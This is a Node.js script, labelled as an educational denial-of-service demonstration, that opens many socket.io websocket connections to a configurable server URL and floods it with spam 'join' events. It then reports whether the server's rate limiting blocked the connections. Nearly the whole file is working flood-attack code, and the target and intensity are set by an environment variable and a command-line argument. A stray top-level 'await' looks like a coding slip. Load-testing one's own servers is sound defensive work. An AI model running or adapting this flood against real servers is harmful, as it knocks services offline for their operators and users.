/**
 * Denial of Service (DoS) Flood Attack Demonstration
 * 
 * This script floods the server with connection requests to demonstrate
 * how a vulnerable system can be overwhelmed without rate limiting.
 * 
 * ⚠️ FOR EDUCATIONAL PURPOSES ONLY
 */

const io = require('socket.io-client');

const BACKEND_URL = process.env.BACKEND_URL || 'http://localhost:4000';
const ATTACK_INTENSITY = parseInt(process.argv[2]) || 100; // Number of connections
const REQUESTS_PER_CONNECTION = 10;

console.log('═══════════════════════════════════════════════════');
console.log('🔴 DENIAL OF SERVICE (DoS) ATTACK DEMONSTRATION');
console.log('═══════════════════════════════════════════════════\n');

console.log(`📡 Target: ${BACKEND_URL}`);
console.log(`💥 Attack Intensity: ${ATTACK_INTENSITY} connections`);
console.log(`📨 Requests per connection: ${REQUESTS_PER_CONNECTION}`);
console.log(`📊 Total requests: ${ATTACK_INTENSITY * REQUESTS_PER_CONNECTION}\n`);

console.log('⚠️  WARNING: This will stress the target server!');
console.log('   Only run against your own test server.\n');

const sockets = [];
let connectedCount = 0;
let failedCount = 0;
let requestsSent = 0;

const startTime = Date.now();

console.log('🚀 Launching attack...\n');

for (let i = 0; i < ATTACK_INTENSITY; i++) {
    const socket = io(BACKEND_URL, {
        reconnection: false,
        timeout: 5000,
        transports: ['websocket']
    });

    socket.on('connect', () => {
        connectedCount++;

        // Spam join requests
        for (let j = 0; j < REQUESTS_PER_CONNECTION; j++) {
            socket.emit('join', {
                roomId: `spam-room-${i}-${j}`,
                user: {
                    id: `bot-${i}-${j}`,
                    name: `AttackBot${i}`
                }
            });
            requestsSent++;
        }

        // Progress update every 10 connections
        if (connectedCount % 10 === 0) {
            const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
            console.log(`📊 Progress: ${connectedCount}/${ATTACK_INTENSITY} connections (${elapsed}s)`);
        }
    });

    socket.on('connect_error', (error) => {
        failedCount++;
    });

    socket.on('error', (error) => {
        // Silent error handling
    });

    sockets.push(socket);

    // Small delay to avoid overwhelming local network
    if (i % 50 === 0 && i > 0) {
        await sleep(100);
    }
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// Wait for all connections to complete
setTimeout(() => {
    const duration = ((Date.now() - startTime) / 1000).toFixed(2);

    console.log('\n═══════════════════════════════════════════════════');
    console.log('📈 ATTACK RESULTS');
    console.log('═══════════════════════════════════════════════════\n');

    console.log(`⏱️  Duration: ${duration} seconds`);
    console.log(`✅ Successful connections: ${connectedCount}`);
    console.log(`❌ Failed connections: ${failedCount}`);
    console.log(`📨 Total requests sent: ${requestsSent}\n`);

    const successRate = ((connectedCount / ATTACK_INTENSITY) * 100).toFixed(1);
    console.log(`📊 Success Rate: ${successRate}%\n`);

    // Analyze impact
    console.log('🎯 IMPACT ANALYSIS:');
    if (connectedCount > ATTACK_INTENSITY * 0.8) {
        console.log('   🚨 CRITICAL: Server accepted >80% of attack connections!');
        console.log('   ⚠️  Server is VULNERABLE to DoS attacks');
        console.log('   💡 Recommendation: Implement rate limiting\n');
    } else if (connectedCount > ATTACK_INTENSITY * 0.5) {
        console.log('   ⚠️  MODERATE: Server accepted >50% of connections');
        console.log('   📝 Server has some protection but could be improved\n');
    } else {
        console.log('   ✅ GOOD: Server blocked majority of attack connections');
        console.log('   🛡️  Rate limiting appears to be working\n');
    }

    console.log('═══════════════════════════════════════════════════\n');

    // Cleanup
    console.log('🧹 Cleaning up connections...');
    sockets.forEach(s => {
        try {
            s.disconnect();
        } catch (e) {
            // Ignore cleanup errors
        }
    });

    console.log('✅ Attack demonstration complete\n');
    process.exit(0);
}, 15000);

console.log('⏳ Attack in progress... (will complete in ~15 seconds)\n');
